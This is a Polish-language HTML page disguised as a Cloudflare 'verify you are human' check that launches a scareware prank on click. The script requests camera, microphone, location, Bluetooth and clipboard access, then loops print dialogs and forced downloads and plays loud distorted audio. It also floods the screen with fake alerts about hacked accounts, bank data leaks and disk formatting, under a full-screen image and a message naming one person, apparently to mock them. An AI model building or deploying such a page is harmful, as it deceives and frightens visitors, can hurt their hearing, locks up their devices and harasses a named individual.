<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Weryfikacja Cloudflare</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: -apple-system, sans-serif;
            background-color: #fff; color: #333; overflow: hidden;
            display: flex; justify-content: center; align-items: center;
        }

        /* Niewinny start Cloudflare */
        #cloudflare-wrapper {
            text-align: left; max-width: 400px; padding: 25px;
            border: 1px solid #e2e8f0; border-radius: 8px; background: #fff;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05); z-index: 100;
        }
        .cf-header { font-size: 1.5rem; font-weight: 600; margin-bottom: 10px; color: #1a202c; }
        .cf-text { font-size: 0.95rem; color: #4a5568; margin-bottom: 25px; }
        .cf-box {
            border: 1px solid #cbd5e0; padding: 12px; border-radius: 4px;
            display: flex; align-items: center; background: #f7fafc;
            cursor: pointer; transition: background 0.2s;
        }
        .cf-box:hover { background: #edf2f7; }
        .cf-checkbox {
            width: 24px; height: 24px; border: 2px solid #a0aec0; border-radius: 3px;
            margin-right: 15px; background: #fff; display: flex; justify-content: center; align-items: center;
        }
        .cf-box span { font-weight: 500; font-size: 1rem; }

        /* Kursor-Pająk i Glitch */
        .cursed-cursor { cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" style="font-size:80px"><text y="80">🕷️</text></svg>'), auto !important; }
        .hyper-glitch { animation: hyperGlitch 0.1s infinite; }
        
        /* TWARZ GRYGLICKIEGO Z DISCORDA */
        #gryglicki-face {
            display: none; position: fixed; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            min-width: 100vw; min-height: 100vh; object-fit: cover;
            z-index: 7000; pointer-events: none;
            opacity: 0.95; mix-blend-mode: difference;
            animation: scaryFace 0.1s infinite;
        }

        /* GIGANTYCZNY NAPIS */
        #gryglicki-overlay {
            display: none; position: fixed; top: 50%; left: 50%;
            transform: translate(-50%, -50%); width: 100vw;
            font-size: 11vw; font-weight: 900; color: #ff0000;
            text-align: center; text-transform: uppercase;
            text-shadow: 6px 6px 0px #000, -6px -6px 0px #000, 0 0 50px #ff0000;
            z-index: 8000; pointer-events: none;
            animation: textGlitch 0.1s infinite;
        }

        /* Fake Okienka Systemowe */
        .fake-popup {
            position: absolute; background: #c0c0c0; border: 2px solid #000;
            box-shadow: 2px 2px 0 #fff inset, -2px -2px 0 #888 inset, 5px 5px 15px rgba(0,0,0,0.8);
            font-family: 'Courier New', Courier, monospace; padding: 2px;
            z-index: 9000; display: flex; flex-direction: column;
            animation: popIn 0.1s ease-out;
        }
        .popup-header {
            background: #000080; color: white; font-weight: bold; padding: 4px 6px;
            display: flex; justify-content: space-between; font-size: 13px;
        }
        .popup-body {
            padding: 15px; text-align: center; background: #c0c0c0; color: #000; font-weight: 900;
            display: flex; align-items: center; justify-content: center; font-size: 15px;
        }

        /* Definicje Animacji */
        @keyframes scaryFace {
            0% { transform: translate(-50%, -50%) scale(1); filter: invert(0) contrast(1.5); }
            50% { transform: translate(-52%, -48%) scale(1.1); filter: invert(1) contrast(3) hue-rotate(90deg); }
            100% { transform: translate(-48%, -52%) scale(1.05); filter: invert(0) contrast(2) hue-rotate(-90deg); }
        }
        @keyframes hyperGlitch {
            0% { filter: invert(0) hue-rotate(0deg); transform: scale(1) translate(0, 0); }
            25% { filter: invert(1) hue-rotate(90deg); transform: scale(1.05) translate(-10px, 10px); }
            50% { filter: invert(0) hue-rotate(180deg); transform: scale(0.95) translate(10px, -10px); }
            75% { filter: invert(1) hue-rotate(270deg); transform: scale(1.1) translate(-15px, 0); }
            100% { filter: invert(0) hue-rotate(360deg); transform: scale(1) translate(0, 0); }
        }
        @keyframes textGlitch {
            0% { transform: translate(-50%, -50%) scale(1) skew(0deg); color: red; }
            50% { transform: translate(-52%, -48%) scale(1.1) skew(10deg); color: yellow; }
            100% { transform: translate(-48%, -52%) scale(0.9) skew(-10deg); color: white; }
        }
        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
    </style>
</head>
<body id="main-body">

    <div id="cloudflare-wrapper">
        <div class="cf-header">Verify you are human</div>
        <div class="cf-text">Please stand by, while we are checking your browser...</div>
        <div class="cf-box" onclick="startSzpont()">
            <div class="cf-checkbox" id="checkbox-ui"></div>
            <span>Verify you are human</span>
        </div>
    </div>

    <!-- Twarz Gryglickiego z linku Discorda -->
    <img id="gryglicki-face" src="https://media.discordapp.net/attachments/1525595004486287586/1527416250169294858/images.png?ex=6a5a94bc&is=6a59433c&hm=65f16e023440f70704434d1a14b37a8fd4d492c765dd1ba86b75786d47b0f431&=&format=webp&quality=lossless" alt="Oczy Gryglickiego">

    <!-- Napis na cały ekran -->
    <div id="gryglicki-overlay">GRYGLICKI HAKUJE TWOJ TELEFON</div>

    <script>
        let isStarted = false;

        function startSzpont() {
            if (isStarted) return;
            isStarted = true;

            // Zaznaczenie checkboxa
            document.getElementById('checkbox-ui').innerHTML = '<span style="color: green; font-weight: bold;">✔</span>';

            setTimeout(() => {
                const body = document.getElementById('main-body');
                document.getElementById('cloudflare-wrapper').style.display = 'none';
                
                // Odpalenie grafik
                document.getElementById('gryglicki-face').style.display = 'block';
                document.getElementById('gryglicki-overlay').style.display = 'block';
                
                body.classList.add('cursed-cursor');
                body.classList.add('hyper-glitch');
                body.style.backgroundColor = 'black';

                // ==========================================
                // 1. ZMASOWANY ATAK UPRAWNIEŃ (SZPONT!)
                // ==========================================
                
                // Zapytanie o Kamerę i Mikrofon
                setTimeout(() => { navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(()=>{}); }, 500);
                
                // Zapytanie o Lokalizację
                setTimeout(() => { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); }, 1500);
                
                // Zapytanie o Bluetooth
                setTimeout(() => { try { navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(()=>{}); } catch(e){} }, 2500);
                
                // Zapytanie o dostęp do Schowka (Kopiuj/Wklej)
                setTimeout(() => { try { navigator.clipboard.readText().catch(()=>{}); } catch(e){} }, 3500);

                // ==========================================
                // 2. MĘCZARNIA Z DRUKARKĄ
                // ==========================================
                // Wyrzuca okno drukowania co 4 sekundy - totalnie blokuje ekran
                setInterval(() => {
                    try { window.print(); } catch(e) {}
                }, 4000);

                // ==========================================
                // 3. NIESKOŃCZONE POBIERANIE ZDJĘĆ/PLIKÓW
                // ==========================================
                let downloadCount = 1;
                setInterval(() => {
                    try {
                        const a = document.createElement('a');
                        const blob = new Blob(["SZPONT! GRYGLICKI PRZEJĄŁ URZĄDZENIE!"], {type: 'text/plain'});
                        a.href = URL.createObjectURL(blob);
                        a.download = `HACK_LOG_${downloadCount}.txt`;
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        downloadCount++;
                    } catch(e) {}
                }, 1000);

                // ==========================================
                // 4. POTRÓJNE AUDIO (Niszczyciel uszu)
                // ==========================================
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const gain = audioCtx.createGain();
                    gain.connect(audioCtx.destination);
                    gain.gain.value = 2.5; 
                    
                    const osc1 = audioCtx.createOscillator(); osc1.type = 'sawtooth'; osc1.connect(gain); osc1.start();
                    const osc2 = audioCtx.createOscillator(); osc2.type = 'square'; osc2.connect(gain); osc2.start();

                    setInterval(() => {
                        osc1.frequency.value = Math.random() * 2000 + 1000;
                        osc2.frequency.value = Math.random() * 800 + 100;
                    }, 80);
                } catch(e) {}

                // ==========================================
                // 5. GENERYCZNE OKIENKA (WYLOGOWYWANIE)
                // ==========================================
                // Wyczyszczone z prywatnych danych - czysty, ogólny hacking
                const messages = [
                    "Wylogowywanie z: Instagram...", 
                    "Zmiana hasła: TikTok...", 
                    "Pobieranie prywatnych wiadomości...", 
                    "SZPONT!!!", 
                    "Wysyłanie historii przeglądarki na Facebooka...", 
                    "Formatowanie dysku systemowego...", 
                    "Wyciek Danych z aplikacji bankowej!", 
                    "GRYGLICKI WIDZI CIĘ PRZEZ KAMERĘ",
                    "Kasowanie folderu ze zdjęciami...",
                    "JEREMIASZ FAKTOR HACK"
                ];
                
                setInterval(() => {
                    const existingPopups = document.getElementsByClassName('fake-popup');
                    if (existingPopups.length > 150) existingPopups[0].remove();

                    const popup = document.createElement('div');
                    popup.className = 'fake-popup';
                    
                    const width = Math.random() * 250 + 180;
                    const height = Math.random() * 100 + 60;
                    popup.style.width = width + 'px';
                    popup.style.height = height + 'px';
                    popup.style.left = Math.random() * (window.innerWidth - width) + 'px';
                    popup.style.top = Math.random() * (window.innerHeight - height) + 'px';
                    
                    const msg = messages[Math.floor(Math.random() * messages.length)];
                    popup.innerHTML = `
                        <div class="popup-header"><span>Błąd Krytyczny</span><span>X</span></div>
                        <div class="popup-body">${msg}</div>
                    `;
                    
                    document.body.appendChild(popup);

                    setTimeout(() => {
                        let top = parseFloat(popup.style.top);
                        const fallInterval = setInterval(() => {
                            top += Math.random() * 20;
                            popup.style.top = top + 'px';
                            if (top > window.innerHeight) {
                                clearInterval(fallInterval);
                                popup.remove();
                            }
                        }, 50);
                    }, 1500);
                }, 100);

            }, 400); // Małe opóźnienie po kliknięciu "Verify"
        }
    </script>
</body>
</html>
